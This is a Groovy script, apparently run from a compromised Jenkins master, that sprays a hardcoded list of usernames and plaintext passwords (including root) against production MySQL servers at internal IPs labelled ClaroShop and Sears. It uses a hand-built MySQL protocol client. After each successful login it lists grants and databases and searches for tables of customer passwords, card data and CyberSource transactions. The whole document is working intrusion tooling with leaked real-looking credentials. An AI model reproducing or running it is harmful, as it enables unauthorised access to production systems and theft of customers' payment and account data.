// MySQL PROD ClaroShop (172.27.140.151:3306) desde Jenkins master (Groovy nativo)
// El port 3306 estaba ABIERTO desde el container .23 que está en la misma subred
// También probar 172.27.140.151 desde Jenkins master directamente

import java.net.Socket
import java.net.InetSocketAddress
import java.security.MessageDigest

class CsProd { byte[] d; int i = 0
  long le() { int b=d[i]&0xFF;i++;if(b<0xFB)return(long)b;if(b==0xFC){long v=(d[i]&0xFF)|((d[i+1]&0xFF)<<8);i+=2;return v};if(b==0xFD){long v=(d[i]&0xFF)|((d[i+1]&0xFF)<<8)|((d[i+2]&0xFF)<<16);i+=3;return v};long v=0;for(int k=0;k<8;k++){v|=((long)(d[i+k]&0xFF))<<(8*k)};i+=8;return v}
  String ls() { int fb=d[i]&0xFF;if(fb==0xFB){i++;return null};long l=le();String s=new String(d,i,(int)l,'UTF-8');i+=(int)l;return s }
}
class QCsProd {
  DataInputStream ins; BufferedOutputStream outs; Socket sock
  byte[] rp() { int len=(ins.readUnsignedByte())|(ins.readUnsignedByte()<<8)|(ins.readUnsignedByte()<<16);ins.readUnsignedByte();byte[] pl=new byte[len];ins.readFully(pl);return pl }
  void wp(int seq,byte[] pl) { int len=pl.length;outs.write(len&0xFF);outs.write((len>>8)&0xFF);outs.write((len>>16)&0xFF);outs.write(seq&0xFF);outs.write(pl);outs.flush() }
  String auth(String host,int port,String user,String pass) {
    try {
      sock=new Socket();sock.connect(new InetSocketAddress(host,port),5000);sock.setSoTimeout(15000)
      ins=new DataInputStream(new BufferedInputStream(sock.getInputStream()));outs=new BufferedOutputStream(sock.getOutputStream())
      byte[] p=rp();if((p[0]&0xFF)!=10)return "BAD_PROTO"
      int i=1;while(p[i]!=0){i++};i++;i+=4
      byte[] s1=new byte[8];System.arraycopy(p,i,s1,0,8);i+=8;i++;i+=2;i++;i+=2;i+=2
      int aLen=(p[i]&0xFF);i++;i+=10;int s2Len=Math.max(13,aLen-8);def s2l=[];int av=p.length-i
      for(int k=0;k<Math.min(s2Len,av);k++){if(p[i+k]!=0)s2l.add(p[i+k])}
      byte[] seed=new byte[8+s2l.size()];System.arraycopy(s1,0,seed,0,8);for(int k=0;k<s2l.size();k++)seed[8+k]=(byte)s2l[k]
      def md=MessageDigest.getInstance('SHA-1');byte[] h1=md.digest(pass.getBytes('UTF-8'));byte[] h2=md.digest(h1)
      md.reset();md.update(seed);md.update(h2);byte[] h3=md.digest()
      byte[] tok=new byte[20];for(int j=0;j<20;j++)tok[j]=(byte)((h1[j]^h3[j])&0xFF)
      int caps=0x1|0x200|0x2000|0x8000|0x80000|0x20000
      ByteArrayOutputStream b=new ByteArrayOutputStream()
      b.write(caps&0xFF);b.write((caps>>8)&0xFF);b.write((caps>>16)&0xFF);b.write((caps>>24)&0xFF)
      b.write(0);b.write(0);b.write(0);b.write(1);b.write(33);b.write(new byte[23])
      b.write(user.getBytes('UTF-8'));b.write(0);b.write(tok.length);b.write(tok);b.write('mysql_native_password'.getBytes('UTF-8'));b.write(0)
      wp(1,b.toByteArray());byte[] ap=rp();int at=ap[0]&0xFF
      if(at==0xFF){int code=(ap[1]&0xFF)|((ap[2]&0xFF)<<8);return "ERR_${code}: "+new String(ap,3,ap.length-3,'UTF-8')}
      return "AUTH_OK"
    } catch(Exception e) { return "CONN_ERR: "+e.getMessage() }
  }
  String q(String sql) {
    try {
      ByteArrayOutputStream qb=new ByteArrayOutputStream();qb.write(0x03);qb.write(sql.getBytes('UTF-8'))
      wp(0,qb.toByteArray());byte[] r=rp();int b0=r[0]&0xFF
      if(b0==0xFF){int code=(r[1]&0xFF)|((r[2]&0xFF)<<8);return "ERR_${code}: "+new String(r,3,r.length-3,'UTF-8')}
      if(b0==0x00)return "OK"
      CsProd c0=new CsProd(d:r);long cc=c0.le()
      def cols=[];(0..<cc).each{byte[] cp=rp();CsProd cc2=new CsProd(d:cp);4.times{cc2.ls()};cols.add(cc2.ls())}
      rp()
      def rows=[];int guard=0
      while(guard++<200){byte[] r2=rp();int rb=r2[0]&0xFF;if(rb==0xFE&&r2.length<9)break;if(rb==0xFF){rows.add(["ROWERR"]);break};CsProd rc=new CsProd(d:r2);def vals=[];(0..<cc).each{def v=rc.ls();vals.add(v==null?"NULL":v.take(200))};rows.add(vals)}
      StringBuilder res=new StringBuilder();res.append("COLS["+cols.join("|")+"]\n");rows.each{res.append("ROW["+it.join("|")+"]\n")};return res.toString()
    } catch(Exception e) { return "QERR: "+e.getMessage() }
  }
  void close(){try{sock?.close()}catch(Exception ignored){}}
}

// Credential matrix para ClaroShop PROD (172.27.140.151:3306)
def targets = [
  ['172.27.140.151', 3306, 'appmsclient',        'd9FNoft#NSaEZgvt'],
  ['172.27.140.151', 3306, 'dbapipedidoscsb',    'YF8v{%dvupN3V1%T'],
  ['172.27.140.151', 3306, 'dbclaroapilandinga', 'ApLik$r92_GF73.y'],
  ['172.27.140.151', 3306, 'croncsasigdig',      '5er6_dY65aSgf/s2'],
  ['172.27.140.151', 3306, 'dbcronproductos',    '0c1A0ZW0Kh#wjqdRHV$b63A'],
  ['172.27.140.151', 3306, 'root',               'JenkisLegasy25'],
  ['172.27.140.151', 3306, 'root',               'auroraboreal00'],
  ['172.27.140.151', 3306, 'root',               ''],
  // Also try 172.27.140.143 (alternate Sears/CS DB)
  ['172.27.140.143', 3306, 'appmsclient',        'd9FNoft#NSaEZgvt'],
  ['172.27.140.143', 3306, 'dbcronproductos',    '0c1A0ZW0Kh#wjqdRHV$b63A'],
  ['172.27.140.143', 3308, 'dbcronproductos',    '0c1A0ZW0Kh#wjqdRHV$b63A'],
  // PROD Sears direct (may be routable from Jenkins master)
  ['172.27.141.24', 3308, 'dbcronproductos',     '0c1A0ZW0Kh#wjqdRHV$b63A'],
  ['172.27.141.24', 3308, 'dbsmartinsight',      'CD49uwg*iG9m5d+y'],
  ['172.27.141.24', 3308, 'root',                'JenkisLegasy25'],
]

def qry = { String host, int port, String user, String pass, String sql ->
  def mc = new QCsProd()
  try {
    def ar = mc.auth(host, port, user, pass)
    if (!ar.startsWith("AUTH_OK")) { mc.close(); return ar }
    def r = mc.q(sql); mc.close(); return r
  } catch(Exception e) { try{mc.close()}catch(Exception ignored){}; return "EXC: "+e.getMessage() }
}

println "=== ClaroShop PROD MySQL Spray ==="
def hitHosts = []
targets.each { t ->
  def h=t[0]; def port=t[1]; def u=t[2]; def pw=t[3]
  def mc2 = new QCsProd()
  def ar = mc2.auth(h, port, u, pw)
  println "  [${h}:${port}] ${u} → ${ar}"
  if (ar.startsWith("AUTH_OK")) {
    hitHosts.add([h, port, u, pw, mc2])
    // Get grants + databases
    println "    GRANTS: " + mc2.q("SHOW GRANTS FOR CURRENT_USER()")
    println "    DBS: " + mc2.q("SHOW DATABASES")
    // Count key tables
    ['pedidos','clientes','clientescontrasena','datostarjeta','cybersource_transacciones'].each { tbl ->
      def cnt = mc2.q("SELECT COUNT(*) FROM information_schema.TABLES WHERE TABLE_SCHEMA NOT IN ('information_schema','performance_schema','mysql','sys') AND TABLE_NAME='${tbl}'")
      println "    SCHEMA_COUNT(${tbl}): ${cnt}"
    }
    mc2.close()
  } else {
    try{mc2.close()}catch(Exception ignored){}
  }
}

println "\n=== RESULTADO FINAL ==="
if (hitHosts.isEmpty()) {
  println "NO AUTH on any ClaroShop PROD target"
} else {
  println "ACCESO CONFIRMADO en ${hitHosts.size()} entradas"
  // Try specific queries on first hit
  def first = hitHosts[0]
  def H=first[0]; def P=first[1]; def U=first[2]; def PW=first[3]
  println "\n--- DATABASES en ${H}:${P} as ${U} ---"
  println qry(H,P,U,PW,"SHOW DATABASES")
  println "\n--- TABLE COUNT por schema ---"
  println qry(H,P,U,PW,"SELECT TABLE_SCHEMA,COUNT(*) as cnt FROM information_schema.TABLES WHERE TABLE_SCHEMA NOT IN ('information_schema','performance_schema','mysql','sys') GROUP BY TABLE_SCHEMA ORDER BY cnt DESC")
}

println "=== FIN CLAROSHOP PROD ==="
